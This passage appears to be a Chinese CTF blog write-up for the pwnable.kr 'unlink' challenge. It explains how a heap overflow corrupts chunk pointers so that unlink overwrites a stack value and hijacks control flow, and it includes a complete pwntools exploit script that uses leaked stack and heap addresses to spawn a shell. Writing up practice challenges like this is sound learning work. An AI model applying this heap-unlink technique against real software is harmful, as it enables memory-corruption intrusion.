好，我们现在构造payload： 12# 'a'用作填充chunk A剩余空间到达chunk B堆顶；payload = p32(shell_addr)+'a'*12+p32(heap_addr + 12)+p32(stack_addr + 0x10) 溢出覆写之后的chunk A： data A on heap: ——————————— &lt;=A | FD | BK | ——————————— &lt;=A-&gt;buf , A+0x8 | shellcode (4 byte) | | AAAA (4 byte junk) | ——————————— | AAAA | AAAA | ——————————— &lt;=B , A+0x8+0x8+0x8 |A heap +12|A stack+0x10| ——————————— &lt;=B-&gt;buf | | ——————————— 接下来调用unlink及其后面指令的原理简单记录： 12345678910111213141516//unlink之后得到的两条方程*（（A stack+0x10）+ 0）= A heap +12*（（A heap +12） + 4）= A stack+0x10//指针一化简得到*(ebp-0x14+0x10+0)=shellcode + 0x4//ebp-0x4指向的值被覆写为shellcode + 0x4//ebp-0x4指向的值shellcode+4被传入ecxmov ecx,[ebp+var_4]//ecx-4指向的shellcode开始行被传入到esp中（shellcode+4-4）lea esp,[ecx-4]//退出main，但是eip被修改为shellcode开始运行行，变成了运行shellcoderetn 脚本12345678910111213141516171819202122232425#coding=utf-8from pwn import *context.log_level = 'debug'shell_addr = 0x080484eb#IDA函数列表可查得# 与服务器建立ssh链接s = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest' )p = s.process("./unlink") # 加载程序# 获取 A 栈地址p.recvuntil("here is stack address leak: ")stack_addr = p.recv(10)stack_addr = int(stack_addr,16)# 获取 A 堆地址p.recvuntil("here is heap address leak: ")heap_addr = p.recv(9)heap_addr = int(heap_addr,16)payload = p32(shell_addr)+'a'*12+p32(heap_addr + 12)+p32(stack_addr +16)p.send(payload)p.interactive() 参考全面剖析Pwnable.kr unlink pwnable.kr unlink pwnable.kr之unlink pwnable.kr unlink之write up 【pwnable.kr】 unlink]]></content>
      <categories>
        <category>pwn</category>
        <category>pwnable.kr</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
        <tag>pwn</tag>
        <tag>堆</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
</search>
